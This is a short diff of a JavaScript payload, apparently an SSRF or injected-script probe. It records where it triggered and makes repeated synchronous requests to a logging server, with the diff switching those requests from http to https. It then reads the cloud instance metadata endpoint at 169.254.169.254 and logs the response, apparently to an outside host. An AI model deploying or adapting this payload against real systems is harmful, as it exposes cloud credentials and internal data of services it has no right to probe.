@@ -28,7 +28,7 @@ log('Triggered in ' + window.location.href);
 for(var i = 0; i < 60; ++i) {
     log('Loop ' + i);
     var req = new XMLHttpRequest();
-    req.open('GET', 'http://' + logTimeServer + '/', false);
+    req.open('GET', 'https://' + logTimeServer + '/', false);
     req.send();
 }
 log('Meta Data: ' + get('http://169.254.169.254/latest/meta-data/'));
